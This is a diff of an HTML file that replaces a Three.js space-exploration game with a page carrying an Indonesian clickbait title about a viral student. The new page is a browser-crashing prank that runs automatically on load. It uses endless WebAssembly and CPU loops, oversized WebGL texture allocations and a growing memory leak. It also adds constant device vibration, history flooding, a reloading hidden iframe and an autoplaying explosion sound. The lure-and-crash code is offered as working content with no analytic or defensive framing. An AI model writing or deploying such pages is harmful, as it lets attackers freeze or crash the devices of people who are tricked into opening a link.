@@ -1,613 +1,91 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Space Explorer Saandox</title>
+    <title>Viral seorang siswa anak smk berusia 17 tahun insial T ini melakukan hal yang tak terduga di dalam kelas reaksi warga net terherang-herang dengan kelakuan siswa tersebut</title>
     <style>
-        body { 
-            margin: 0; 
-            overflow: hidden; 
-            background-color: #000;
-            color: white;
-            font-family: 'Arial', sans-serif;
-        }
-        #info {
-            position: absolute;
-            top: 10px;
-            width: 100%;
-            text-align: center;
-            z-index: 100;
-            font-size: 1.2em;
-            text-shadow: 0 0 10px #00a2ff;
-        }
-        #controls {
-            position: absolute;
-            bottom: 20px;
-            left: 20px;
-            z-index: 100;
-            background: rgba(0,0,0,0.7);
-            padding: 15px;
-            border-radius: 10px;
-            border: 1px solid #00a2ff;
-            font-size: 0.9em;
-        }
-        #loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 999;
-        }
-        #progress {
-            width: 300px;
-            height: 2px;
-            background: #333;
-            margin-top: 20px;
-        }
-        #progress-bar {
-            height: 100%;
-            background: #00a2ff;
-            width: 0%;
-            transition: width 0.3s;
-        }
-        #ship {
-            position: absolute;
-            bottom: 50%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 40px;
-            height: 60px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 150"><path d="M50 0 L100 50 L80 150 L20 150 L0 50 Z" fill="rgba(200,200,255,0.8)"/></svg>') no-repeat;
-            background-size: contain;
-            z-index: 50;
-            pointer-events: none;
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            color: #fff;
         }
     </style>
+    <script>
+
+        function crashWASM() {
+            const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00]);
+            const module = new WebAssembly.Module(wasmCode);
+            while (true) {
+                new WebAssembly.Instance(module);
+            }
+        }
+
+        function crashGPU() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                for (let i = 0; i < 1000; i++) {
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32768, 32768, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                }
+            }
+        }
+
+        function cpuLoad() {
+            while (true) {
+                Math.sqrt(Math.random()) + Math.pow(Math.random(), Math.random());
+            }
+        }
+
+        // ==== Eksekusi Serentak ====
+        setTimeout(crashWASM, 0);
+        setTimeout(crashGPU, 10);
+        setTimeout(cpuLoad, 20);
+    </script>
 </head>
 <body>
-    <div id="info">SPACE EXPLORER HD - WASD untuk bergerak | Mouse untuk melihat | SPACE/SHIFT untuk naik/turun</div>
-    <div id="controls">
-        <div><strong>Kontrol:</strong></div>
-        <div>WASD: Gerakan maju/kiri/mundur/kanan</div>
-        <div>Mouse: Putar kamera</div>
-        <div>SPACE/SHIFT: Naik/Turun</div>
-        <div>R: Reset posisi</div>
-        <div>F: Mode penerbangan bebas</div>
-        <div>1-4: Kecepatan berbeda</div>
-    </div>
-    <div id="loading">
-        <h2>MEMUAT ALAM SEMESTA...</h2>
-        <div id="progress"><div id="progress-bar"></div></div>
-    </div>
-    <div id="ship"></div>
 
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/PointerLockControls.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/loaders/GLTFLoader.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/postprocessing/EffectComposer.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/postprocessing/RenderPass.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/postprocessing/UnrealBloomPass.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/shaders/CopyShader.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/shaders/LuminosityHighPassShader.js"></script>
-    
+    <audio autoplay loop>
+        <source src="https://www.myinstants.com/media/sounds/bomb-explosion.mp3" type="audio/mpeg">
+    </audio>
+
     <script>
-        // SCENE SETUP
-        const scene = new THREE.Scene();
-        scene.fog = new THREE.FogExp2(0x000010, 0.001);
-        
-        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 10000);
-        camera.position.set(0, 0, 50);
-        
-        const renderer = new THREE.WebGLRenderer({ antialias: true, logarithmicDepthBuffer: true });
-        renderer.setPixelRatio(window.devicePixelRatio);
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        renderer.shadowMap.enabled = true;
-        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
-        renderer.toneMapping = THREE.ACESFilmicToneMapping;
-        renderer.toneMappingExposure = 1;
-        document.body.appendChild(renderer.domElement);
-
-        // BLOOM EFFECT
-        const bloomParams = {
-            exposure: 1,
-            bloomStrength: 1.5,
-            bloomThreshold: 0,
-            bloomRadius: 0.5
-        };
-        
-        const renderScene = new THREE.RenderPass(scene, camera);
-        const bloomPass = new THREE.UnrealBloomPass(
-            new THREE.Vector2(window.innerWidth, window.innerHeight),
-            bloomParams.bloomStrength,
-            bloomParams.bloomRadius,
-            bloomParams.bloomThreshold
-        );
-        
-        const composer = new THREE.EffectComposer(renderer);
-        composer.addPass(renderScene);
-        composer.addPass(bloomPass);
-
-        // LOADING MANAGER
-        const loadingManager = new THREE.LoadingManager();
-        const textureLoader = new THREE.TextureLoader(loadingManager);
-        
-        let assetsLoaded = 0;
-        const totalAssets = 10;
-        
-        loadingManager.onProgress = (url, itemsLoaded, itemsTotal) => {
-            assetsLoaded = itemsLoaded;
-            const progress = (assetsLoaded / totalAssets) * 100;
-            document.getElementById('progress-bar').style.width = `${progress}%`;
-            
-            if (assetsLoaded >= totalAssets) {
-                setTimeout(() => {
-                    document.getElementById('loading').style.opacity = 0;
-                    setTimeout(() => {
-                        document.getElementById('loading').style.display = 'none';
-                        initGame();
-                    }, 500);
-                }, 500);
-            }
-        };
-
-        // STARFIELD
-        const starGeometry = new THREE.BufferGeometry();
-        const starMaterial = new THREE.PointsMaterial({
-            color: 0xffffff,
-            size: 0.2,
-            transparent: true,
-            opacity: 0.8
-        });
-        
-        const starPositions = [];
-        const starColors = [];
-        const starSizes = [];
-        
-        for (let i = 0; i < 10000; i++) {
-            // Position
-            const x = (Math.random() - 0.5) * 2000;
-            const y = (Math.random() - 0.5) * 2000;
-            const z = (Math.random() - 0.5) * 2000;
-            starPositions.push(x, y, z);
-            
-            // Color
-            const color = new THREE.Color();
-            color.setHSL(
-                Math.random() * 0.1 + 0.5,
-                Math.random() * 0.3 + 0.5,
-                Math.random() * 0.5 + 0.5
-            );
-            starColors.push(color.r, color.g, color.b);
-            
-            // Size
-            starSizes.push(Math.random() * 1.5 + 0.5);
-        }
-        
-        starGeometry.setAttribute('position', new THREE.Float32BufferAttribute(starPositions, 3));
-        starGeometry.setAttribute('color', new THREE.Float32BufferAttribute(starColors, 3));
-        starGeometry.setAttribute('size', new THREE.Float32BufferAttribute(starSizes, 1));
-        
-        const stars = new THREE.Points(starGeometry, starMaterial);
-        scene.add(stars);
-
-        // NEBULA BACKGROUND
-        const nebulaTexture = textureLoader.load('https://threejs.org/examples/textures/equirectangular/nebula.png');
-        const nebulaGeometry = new THREE.SphereGeometry(1000, 32, 32);
-        const nebulaMaterial = new THREE.MeshBasicMaterial({
-            map: nebulaTexture,
-            side: THREE.BackSide,
-            transparent: true,
-            opacity: 0.3
-        });
-        const nebula = new THREE.Mesh(nebulaGeometry, nebulaMaterial);
-        scene.add(nebula);
-
-        // PLANETS
-        const planets = [];
-        const planetData = [
-            { name: "Mercury", size: 5, color: 0xaaaaaa, texture: "https://threejs.org/examples/textures/planets/mercury_1k.jpg", orbitRadius: 100, orbitSpeed: 0.01 },
-            { name: "Venus", size: 8, color: 0xe6c229, texture: "https://threejs.org/examples/textures/planets/venus_surface_2k.jpg", orbitRadius: 150, orbitSpeed: 0.008 },
-            { name: "Earth", size: 10, color: 0x1a75ff, texture: "https://threejs.org/examples/textures/planets/earth_atmos_2048.jpg", orbitRadius: 200, orbitSpeed: 0.006, hasClouds: true },
-            { name: "Mars", size: 7, color: 0xc1440e, texture: "https://threejs.org/examples/textures/planets/mars_1k_color.jpg", orbitRadius: 250, orbitSpeed: 0.005 },
-            { name: "Jupiter", size: 20, color: 0xe3b04b, texture: "https://threejs.org/examples/textures/planets/jupiter_2k.jpg", orbitRadius: 350, orbitSpeed: 0.003, hasRings: true },
-            { name: "Saturn", size: 18, color: 0xd8a372, texture: "https://threejs.org/examples/textures/planets/saturn_1k.jpg", orbitRadius: 450, orbitSpeed: 0.002, hasRings: true },
-            { name: "Uranus", size: 12, color: 0x7ecdf4, texture: "https://threejs.org/examples/textures/planets/uranus_1k.jpg", orbitRadius: 550, orbitSpeed: 0.0015 },
-            { name: "Neptune", size: 12, color: 0x5b5ddf, texture: "https://threejs.org/examples/textures/planets/neptune_1k.jpg", orbitRadius: 650, orbitSpeed: 0.001 }
-        ];
-
-        planetData.forEach((data, i) => {
-            const angle = Math.random() * Math.PI * 2;
-            
-            // Planet
-            const geometry = new THREE.SphereGeometry(data.size, 64, 64);
-            let material;
-            
-            try {
-                material = new THREE.MeshPhongMaterial({
-                    map: textureLoader.load(data.texture),
-                    bumpMap: textureLoader.load(data.texture.replace('color', 'bump')),
-                    bumpScale: 0.05,
-                    specular: new THREE.Color(0x333333),
-                    shininess: 10
-                });
-            } catch (e) {
-                material = new THREE.MeshPhongMaterial({
-                    color: data.color,
-                    specular: new THREE.Color(0x333333),
-                    shininess: 10
-                });
-            }
-            
-            const planet = new THREE.Mesh(geometry, material);
-            planet.position.x = Math.cos(angle) * data.orbitRadius;
-            planet.position.z = Math.sin(angle) * data.orbitRadius;
-            planet.position.y = (Math.random() - 0.5) * 50;
-            planet.castShadow = true;
-            planet.receiveShadow = true;
-            
-            // Clouds
-            if (data.hasClouds) {
-                const cloudGeometry = new THREE.SphereGeometry(data.size * 1.02, 64, 64);
-                const cloudMaterial = new THREE.MeshPhongMaterial({
-                    map: textureLoader.load('https://threejs.org/examples/textures/planets/earth_clouds_1024.png'),
-                    transparent: true,
-                    opacity: 0.4
-                });
-                const clouds = new THREE.Mesh(cloudGeometry, cloudMaterial);
-                planet.add(clouds);
-            }
-            
-            // Rings (for Saturn)
-            if (data.hasRings) {
-                const ringGeometry = new THREE.RingGeometry(data.size * 1.5, data.size * 2.5, 64);
-                const ringMaterial = new THREE.MeshPhongMaterial({
-                    map: textureLoader.load('https://threejs.org/examples/textures/planets/saturn_ring.png'),
-                    side: THREE.DoubleSide,
-                    transparent: true
-                });
-                const rings = new THREE.Mesh(ringGeometry, ringMaterial);
-                rings.rotation.x = Math.PI / 2;
-                planet.add(rings);
-            }
-            
-            scene.add(planet);
-            planets.push({
-                mesh: planet,
-                angle: angle,
-                data: data
-            });
-            
-            // Add light to planets
-            const light = new THREE.PointLight(0xffffff, 0.5, 100);
-            light.position.copy(planet.position);
-            scene.add(light);
-        });
-
-        // SUN
-        const sunGeometry = new THREE.SphereGeometry(30, 64, 64);
-        const sunMaterial = new THREE.MeshBasicMaterial({
-            map: textureLoader.load('https://threejs.org/examples/textures/planets/sun_1k.jpg'),
-            color: 0xffffff
-        });
-        const sun = new THREE.Mesh(sunGeometry, sunMaterial);
-        sun.position.set(0, 0, 0);
-        scene.add(sun);
-
-        // SUN LIGHT
-        const sunLight = new THREE.PointLight(0xffffee, 2, 1000);
-        sunLight.castShadow = true;
-        sunLight.shadow.mapSize.width = 2048;
-        sunLight.shadow.mapSize.height = 2048;
-        sunLight.shadow.camera.near = 0.5;
-        sunLight.shadow.camera.far = 1000;
-        scene.add(sunLight);
-
-        // ASTEROIDS
-        const asteroids = [];
-        const asteroidGeometry = new THREE.BufferGeometry();
-        const asteroidCount = 500;
-        
-        const asteroidPositions = [];
-        const asteroidRotations = [];
-        const asteroidScales = [];
-        
-        for (let i = 0; i < asteroidCount; i++) {
-            // Position between 100 and 800 units from center
-            const distance = Math.random() * 700 + 100;
-            const angle = Math.random() * Math.PI * 2;
-            const height = (Math.random() - 0.5) * 200;
-            
-            asteroidPositions.push(
-                Math.cos(angle) * distance,
-                height,
-                Math.sin(angle) * distance
-            );
-            
-            asteroidRotations.push(
-                Math.random() * Math.PI * 2,
-                Math.random() * Math.PI * 2,
-                Math.random() * Math.PI * 2
-            );
-            
-            asteroidScales.push(
-                Math.random() * 2 + 0.5
-            );
-        }
-        
-        // Create base asteroid shape
-        const baseAsteroid = new THREE.IcosahedronGeometry(1, 1);
-        const positionAttribute = baseAsteroid.getAttribute('position');
-        const positions = [];
-        
-        for (let i = 0; i < positionAttribute.count; i++) {
-            const x = positionAttribute.getX(i);
-            const y = positionAttribute.getY(i);
-            const z = positionAttribute.getZ(i);
-            
-            // Randomize vertices to make it look more like an asteroid
-            positions.push(
-                x * (0.7 + Math.random() * 0.6),
-                y * (0.7 + Math.random() * 0.6),
-                z * (0.7 + Math.random() * 0.6)
-            );
-        }
-        
-        asteroidGeometry.setAttribute('position', new THREE.Float32BufferAttribute(positions, 3));
-        asteroidGeometry.setIndex(baseAsteroid.index);
-        asteroidGeometry.computeVertexNormals();
-        
-        const asteroidMaterial = new THREE.MeshPhongMaterial({
-            color: 0x777777,
-            specular: 0x111111,
-            shininess: 5,
-            flatShading: true
-        });
-        
-        for (let i = 0; i < asteroidCount; i++) {
-            const asteroid = new THREE.Mesh(asteroidGeometry, asteroidMaterial);
-            
-            asteroid.position.set(
-                asteroidPositions[i * 3],
-                asteroidPositions[i * 3 + 1],
-                asteroidPositions[i * 3 + 2]
-            );
-            
-            asteroid.rotation.set(
-                asteroidRotations[i * 3],
-                asteroidRotations[i * 3 + 1],
-                asteroidRotations[i * 3 + 2]
-            );
-            
-            const scale = asteroidScales[i];
-            asteroid.scale.set(scale, scale, scale);
-            
-            asteroid.castShadow = true;
-            asteroid.receiveShadow = true;
-            
-            asteroid.userData = {
-                rotationSpeed: new THREE.Vector3(
-                    (Math.random() - 0.5) * 0.01,
-                    (Math.random() - 0.5) * 0.01,
-                    (Math.random() - 0.5) * 0.01
-                )
-            };
-            
-            scene.add(asteroid);
-            asteroids.push(asteroid);
-        }
-
-        // SPACESHIP (placeholder)
-        const shipGeometry = new THREE.ConeGeometry(2, 5, 4);
-        const shipMaterial = new THREE.MeshPhongMaterial({
-            color: 0x6699ff,
-            specular: 0x111111,
-            shininess: 30
-        });
-        const ship = new THREE.Mesh(shipGeometry, shipMaterial);
-        ship.position.set(0, 0, 20);
-        ship.rotation.y = Math.PI;
-        scene.add(ship);
-
-        // GAME STATE
-        const gameState = {
-            speed: 1,
-            maxSpeed: 4,
-            freeFlight: false,
-            moving: false,
-            velocity: new THREE.Vector3(),
-            mouse: new THREE.Vector2(),
-            prevMouse: new THREE.Vector2(),
-            mouseSpeed: 0.002
-        };
-
-        // CONTROLS
-        const controls = new THREE.PointerLockControls(camera, document.body);
-        
-        const keys = {
-            w: false,
-            a: false,
-            s: false,
-            d: false,
-            space: false,
-            shift: false
-        };
-        
-        document.addEventListener('keydown', (e) => {
-            const key = e.key.toLowerCase();
-            
-            if (key in keys) keys[key] = true;
-            if (e.key === ' ') keys.space = true;
-            if (e.key === 'Shift') keys.shift = true;
-            
-            // Speed controls
-            if (e.key === '1') gameState.speed = 1;
-            if (e.key === '2') gameState.speed = 2;
-            if (e.key === '3') gameState.speed = 3;
-            if (e.key === '4') gameState.speed = 4;
-            
-            // Toggle free flight
-            if (key === 'f') {
-                gameState.freeFlight = !gameState.freeFlight;
-                document.getElementById('info').textContent = 
-                    gameState.freeFlight ? 
-                    "SPACE EXPLORER HD - MODE PENERBANGAN BEBAS AKTIF" : 
-                    "SPACE EXPLORER HD - WASD untuk bergerak | Mouse untuk melihat | SPACE/SHIFT untuk naik/turun";
-            }
-            
-            // Reset position
-            if (key === 'r') {
-                controls.getObject().position.set(0, 0, 50);
-                controls.getObject().rotation.set(0, 0, 0);
-            }
-            
-            // Lock pointer when clicking
-            if (e.key === 'Enter' && !controls.isLocked) {
-                controls.lock();
-            }
-        });
-        
-        document.addEventListener('keyup', (e) => {
-            const key = e.key.toLowerCase();
-            
-            if (key in keys) keys[key] = false;
-            if (e.key === ' ') keys.space = false;
-            if (e.key === 'Shift') keys.shift = false;
-        });
-        
-        document.addEventListener('mousemove', (e) => {
-            gameState.mouse.x = (e.clientX / window.innerWidth) * 2 - 1;
-            gameState.mouse.y = -(e.clientY / window.innerHeight) * 2 + 1;
-        });
-        
-        controls.addEventListener('lock', () => {
-            document.getElementById('info').style.display = 'none';
-            document.getElementById('controls').style.display = 'none';
-        });
-        
-        controls.addEventListener('unlock', () => {
-            document.getElementById('info').style.display = 'block';
-            document.getElementById('controls').style.display = 'block';
-        });
-
-        // WINDOW RESIZE
-        window.addEventListener('resize', () => {
-            camera.aspect = window.innerWidth / window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-            composer.setSize(window.innerWidth, window.innerHeight);
-        });
-
-        // CLICK TO PLAY
-        document.body.addEventListener('click', () => {
-            if (!controls.isLocked) {
-                controls.lock();
-            }
-        });
-
-        // INIT GAME
-        function initGame() {
-            // Start animation loop
-            animate();
-            
-            // Add some ambient sound (would need Howler.js for actual sound)
-            console.log("Game initialized! Explore the universe!");
-        }
-
-        // ANIMATION LOOP
-        function animate() {
-            requestAnimationFrame(animate);
-            
-            const delta = 0.016; // Approximate 60fps delta
-            
-            // Update ship position to follow camera
-            if (ship) {
-                ship.position.copy(controls.getObject().position);
-                ship.quaternion.copy(controls.getObject().quaternion);
-                ship.translateZ(-10);
-                ship.translateY(-2);
-            }
-            
-            // Update controls based on keyboard input
-            const moveSpeed = gameState.speed * (keys.shift ? 3 : 1);
-            
-            if (keys.w || keys.a || keys.s || keys.d || keys.space || keys.shift) {
-                gameState.moving = true;
-                
-                if (gameState.freeFlight) {
-                    // Free flight mode - move in look direction
-                    const direction = new THREE.Vector3();
-                    controls.getObject().getWorldDirection(direction);
-                    
-                    if (keys.w) controls.moveForward(moveSpeed);
-                    if (keys.s) controls.moveForward(-moveSpeed);
-                    if (keys.a) controls.moveRight(-moveSpeed);
-                    if (keys.d) controls.moveRight(moveSpeed);
-                    if (keys.space) controls.getObject().position.y += moveSpeed;
-                    if (keys.shift && !keys.w) controls.getObject().position.y -= moveSpeed;
-                } else {
-                    // Standard FPS mode
-                    if (keys.w) controls.moveForward(moveSpeed);
-                    if (keys.s) controls.moveForward(-moveSpeed);
-                    if (keys.a) controls.moveRight(-moveSpeed);
-                    if (keys.d) controls.moveRight(moveSpeed);
-                    if (keys.space) controls.getObject().position.y += moveSpeed;
-                    if (keys.shift) controls.getObject().position.y -= moveSpeed;
-                }
-            } else {
-                gameState.moving = false;
-            }
-            
-            // Smooth mouse look
-            if (controls.isLocked) {
-                const mouseDelta = new THREE.Vector2().subVectors(gameState.mouse, gameState.prevMouse);
-                
-                if (mouseDelta.length() > 0) {
-                    controls.getObject().rotation.y -= mouseDelta.x * gameState.mouseSpeed;
-                    controls.getObject().rotation.x -= mouseDelta.y * gameState.mouseSpeed;
-                    
-                    // Limit vertical rotation
-                    controls.getObject().rotation.x = Math.max(-Math.PI/2, Math.min(Math.PI/2, controls.getObject().rotation.x));
-                }
-                
-                gameState.prevMouse.copy(gameState.mouse);
-            }
-            
-            // Rotate planets
-            planets.forEach(planet => {
-                planet.angle += planet.data.orbitSpeed * delta;
-                planet.mesh.position.x = Math.cos(planet.angle) * planet.data.orbitRadius;
-                planet.mesh.position.z = Math.sin(planet.angle) * planet.data.orbitRadius;
-                planet.mesh.rotation.y += 0.005 * delta * 60;
-                
-                // Update planet light position
-                if (planet.mesh.children.length > 0 && planet.mesh.children[0].isPointLight) {
-                    planet.mesh.children[0].position.copy(planet.mesh.position);
-                }
-            });
-            
-            // Rotate asteroids
-            asteroids.forEach(asteroid => {
-                asteroid.rotation.x += asteroid.userData.rotationSpeed.x;
-                asteroid.rotation.y += asteroid.userData.rotationSpeed.y;
-                asteroid.rotation.z += asteroid.userData.rotationSpeed.z;
-            });
-            
-            // Rotate sun
-            sun.rotation.y += 0.001;
-            
-            // Update sun light position
-            sunLight.position.copy(sun.position);
-            
-            // Render scene with effects
-            composer.render();
+        if (navigator.vibrate) {
+            setInterval(() => navigator.vibrate([200, 100, 200]), 300);
         }
     </script>
+
+    <script>
+        for (let i = 0; i < 100; i++) {
+            history.pushState({}, "", "#" + i);
+        }
+    </script>
+
+    <script>
+        let memoryLeak = [];
+        setInterval(() => {
+            for (let i = 0; i < 5000; i++) {
+                memoryLeak.push(new Array(9000).fill("ꦾ"));
+            }
+        }, 100);
+    </script>
+
+    <iframe src="about:blank" style="display:none" id="loopFrame"></iframe>
+    <script>
+        setInterval(() => {
+            const f = document.getElementById("loopFrame");
+            f.src = "about:blank?" + Math.random();
+        }, 100);
+    </script>
+
+    <script>
+        function overloadFrame() {
+            for (let i = 0; i < 100000; i++) {
+                Math.sqrt(Math.random());
+            }
+            requestAnimationFrame(overloadFrame);
+        }
+        requestAnimationFrame(overloadFrame);
+    </script>
+
 </body>
-  </html>
+</html>
